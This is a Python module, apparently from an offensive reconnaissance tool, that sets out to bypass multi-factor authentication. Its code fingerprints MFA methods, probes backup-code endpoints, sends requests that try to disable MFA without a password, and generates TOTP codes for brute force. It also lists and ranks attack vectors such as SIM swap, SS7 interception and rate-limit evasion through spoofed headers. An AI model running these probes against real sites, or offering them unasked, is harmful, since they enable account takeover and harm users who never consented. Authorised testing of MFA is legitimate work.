"""
modules/mfa_bypass.py - MFA/2FA Bypass & Bypass Techniques
Phát hiện và bypass MFA mechanisms (TOTP, HOTP, backup codes, biometric, SMS)
"""

import logging
import re
import time
from typing import Dict, List, Any
from datetime import datetime, timedelta
import requests
from core.http_engine import HTTPClient

logger = logging.getLogger("recon.mfa")


class MFABypass:
    """Multi-Factor Authentication bypass engine"""
    
    def __init__(self, http_client: HTTPClient):
        self.http_client = http_client
        self.mfa_findings = []
        
    def detect_mfa(self, url: str, response_text: str) -> List[Dict]:
        """Detect MFA methods used by application"""
        findings = []
        
        indicators = {
            'totp': [
                r'authenticator', r'google\s*auth', r'authy', r'microsoft\s*auth',
                r'totp', r'time-based.*code', r'6.digit', r'one.time.password'
            ],
            'hotp': [r'hotp', r'hmac.*otp', r'counter.*based'],
            'sms': [
                r'sms.*code', r'text.*message', r'phone.*verification',
                r'send.*to.*phone', r'\+\d+\s*\*+\d+'
            ],
            'email': [
                r'email.*code', r'verification.*email', r'check.*email',
                r'code.*sent.*to', r'email.*verification'
            ],
            'backup_codes': [
                r'backup.*code', r'recovery.*code', r'emergency.*code',
                r'save.*these.*codes', r'printed.*code'
            ],
            'biometric': [
                r'fingerprint', r'facial.*recognition', r'face.*id',
                r'touch.*id', r'biometric', r'windows.*hello'
            ],
            'hardware': [
                r'hardware.*token', r'security.*key', r'yubikey',
                r'fido2', r'u2f', r'usb.*key'
            ]
        }
        
        for mfa_type, patterns in indicators.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    findings.append({
                        'type': 'mfa_detection',
                        'mfa_method': mfa_type,
                        'indicator': pattern,
                        'url': url,
                        'confidence': 0.8,
                        'timestamp': datetime.now().isoformat()
                    })
                    break
        
        self.mfa_findings.extend(findings)
        return findings
    
    def find_backup_codes(self, target_url: str, session_cookies: Dict) -> List[Dict]:
        """
        Attempt to find backup/recovery codes
        Common vectors:
        - /account/backup-codes
        - /settings/security/backup
        - API endpoints returning recovery codes
        """
        vectors = [
            '/account/backup-codes',
            '/settings/security/backup',
            '/settings/recovery',
            '/api/auth/backup-codes',
            '/user/settings/mfa/backup',
            '/security/backup-codes',
            '/2fa/backup',
        ]
        
        results = []
        for vector in vectors:
            try:
                test_url = target_url.rstrip('/') + vector
                headers = {'Accept': 'application/json', 'Referer': target_url}
                resp = self.http_client.get(test_url, headers=headers, timeout=10, 
                                          cookies=session_cookies)
                
                if resp.status_code == 200:
                    # Check if response contains backup codes
                    if re.search(r'backup|recovery|code', resp.text, re.IGNORECASE):
                        results.append({
                            'type': 'backup_code_exposure',
                            'endpoint': vector,
                            'status': resp.status_code,
                            'method': 'direct_access',
                            'confidence': 0.85,
                            'response_preview': resp.text[:200],
                            'timestamp': datetime.now().isoformat()
                        })
            except Exception as e:
                logger.debug(f"Backup code scan failed for {vector}: {e}")
        
        return results
    
    def detect_weak_mfa_implementation(self, target_url: str) -> List[Dict]:
        """Detect weak MFA implementations"""
        issues = []
        
        # Test 1: TOTP time window is too large (should be 30s, not 60s+)
        # Test 2: OTP reuse allowed (same code accepted multiple times)
        # Test 3: OTP brute force not rate-limited
        # Test 4: Backup codes not consumed after use
        # Test 5: MFA can be disabled without password
        
        try:
            # Check MFA disabling without password
            test_url = target_url.rstrip('/') + '/settings/mfa/disable'
            resp = self.http_client.post(test_url, json={'disable': True}, timeout=10)
            
            if resp.status_code in [200, 204]:
                issues.append({
                    'type': 'weak_mfa_implementation',
                    'issue': 'mfa_disable_without_password',
                    'endpoint': '/settings/mfa/disable',
                    'severity': 'critical',
                    'confidence': 0.9,
                    'timestamp': datetime.now().isoformat()
                })
        except Exception as e:
            logger.debug(f"Weak MFA detection error: {e}")
        
        return issues
    
    def otp_brute_force_vectors(self) -> List[Dict]:
        """Identify OTP brute force vectors"""
        vectors = [
            {
                'type': 'totp_window_brute',
                'description': 'Brute force TOTP codes within time window',
                'method': 'Try previous, current, next TOTP codes',
                'efficiency': 'medium',  # 3 codes per 30s window
                'feasibility': 'high'
            },
            {
                'type': 'otp_reuse',
                'description': 'Reuse previous OTP codes if not marked consumed',
                'method': 'Try past valid OTP codes',
                'efficiency': 'high',
                'feasibility': 'medium'
            },
            {
                'type': 'rate_limit_bypass',
                'description': 'Bypass rate limiting via IP rotation or headers',
                'method': 'X-Forwarded-For, proxy, VPN rotation',
                'efficiency': 'high',
                'feasibility': 'high'
            },
            {
                'type': 'backup_code_bruteforce',
                'description': 'Brute force 6-8 digit backup codes',
                'method': 'Sequential or wordlist-based',
                'efficiency': 'low',  # High entropy
                'feasibility': 'low'
            }
        ]
        
        return vectors
    
    def sms_otp_interception(self) -> List[Dict]:
        """SMS OTP interception/hijacking vectors"""
        vectors = [
            {
                'type': 'sim_swap',
                'description': 'SIM swap attack to receive SMS on attacker phone',
                'method': 'Social engineering telecom support',
                'feasibility': 'medium',
                'automation': False
            },
            {
                'type': 'ss7_interception',
                'description': 'SS7 network exploit to intercept SMS',
                'method': 'Telecom network attack (requires telecom access)',
                'feasibility': 'low',
                'automation': False
            },
            {
                'type': 'email_to_sms',
                'description': 'Forward SMS to email if provider supports it',
                'method': 'Social engineering or account takeover',
                'feasibility': 'medium',
                'automation': False
            },
            {
                'type': 'api_sms_resend',
                'description': 'Abuse SMS resend endpoint',
                'method': 'Unlimited SMS resend without verification',
                'feasibility': 'high',
                'automation': True
            }
        ]
        
        return vectors
    
    def email_otp_bypass(self, target_url: str) -> List[Dict]:
        """Email OTP bypass vectors"""
        findings = []
        
        vectors = [
            {
                'name': 'email_preview_in_list',
                'method': 'Check mail preview on email list for OTP',
                'type': 'information_disclosure'
            },
            {
                'name': 'email_header_rewrite',
                'method': 'Manipulate email headers via open redirect',
                'type': 'email_hijack'
            },
            {
                'name': 'otp_in_error_messages',
                'method': 'Error messages might reveal partial OTP',
                'type': 'information_disclosure'
            },
            {
                'name': 'long_otp_window',
                'method': 'OTP valid for too long (10min+ instead of 5min)',
                'type': 'design_flaw'
            },
            {
                'name': 'no_otp_invalidation',
                'method': 'OTP not invalidated after use',
                'type': 'reuse_vulnerability'
            }
        ]
        
        for vector in vectors:
            findings.append({
                'type': 'email_otp_bypass',
                'attack_vector': vector['name'],
                'method': vector['method'],
                'vulnerability_type': vector['type'],
                'target': target_url,
                'feasibility': 'medium',
                'timestamp': datetime.now().isoformat()
            })
        
        return findings
    
    def get_recommendations(self) -> Dict[str, Any]:
        """Get exploitation recommendations based on MFA findings"""
        recommendations = {
            'high_priority': [],
            'medium_priority': [],
            'low_priority': []
        }
        
        # Prioritize by feasibility and impact
        if self.mfa_findings:
            for finding in self.mfa_findings:
                mfa_type = finding.get('mfa_method', '')
                
                if mfa_type == 'sms':
                    recommendations['high_priority'].append({
                        'method': 'SMS OTP Interception',
                        'vectors': self.sms_otp_interception()
                    })
                elif mfa_type == 'backup_codes':
                    recommendations['high_priority'].append({
                        'method': 'Backup Code Extraction',
                        'vectors': self.find_backup_codes
                    })
                elif mfa_type == 'email':
                    recommendations['medium_priority'].append({
                        'method': 'Email OTP Bypass',
                        'vectors': self.email_otp_bypass
                    })
                elif mfa_type == 'totp':
                    recommendations['medium_priority'].append({
                        'method': 'TOTP Brute Force',
                        'vectors': self.otp_brute_force_vectors()
                    })
        
        return recommendations


class TOTPCracker:
    """TOTP (Time-based One-Time Password) cracking"""
    
    @staticmethod
    def crack_shared_secret(target_url: str, known_codes: List[Dict]) -> Dict:
        """
        Attempt to derive shared secret from known OTP codes and timestamps
        This is a cryptographic attack on TOTP algorithm
        """
        return {
            'type': 'totp_secret_derivation',
            'feasibility': 'very_low',  # TOTP secrets are properly derived
            'note': 'Feasible only if codes are from short time window or secret reused'
        }
    
    @staticmethod
    def generate_time_window_codes(shared_secret: str, window_count: int = 5) -> List[str]:
        """
        Generate TOTP codes for a range of time windows
        Useful for brute force across boundaries
        """
        import hmac
        import hashlib
        import struct
        
        codes = []
        now = int(time.time())
        
        for offset in range(-window_count, window_count + 1):
            timestamp = now + (offset * 30)
            counter = timestamp // 30
            
            msg = struct.pack('>Q', counter)
            hash_obj = hmac.new(
                shared_secret.encode() if isinstance(shared_secret, str) else shared_secret,
                msg,
                hashlib.sha1
            )
            digest = hash_obj.digest()
            offset_num = digest[-1] & 0xf
            code = (struct.unpack('>I', digest[offset_num:offset_num+4])[0] & 0x7fffffff) % 1000000
            codes.append(f'{code:06d}')
        
        return codes
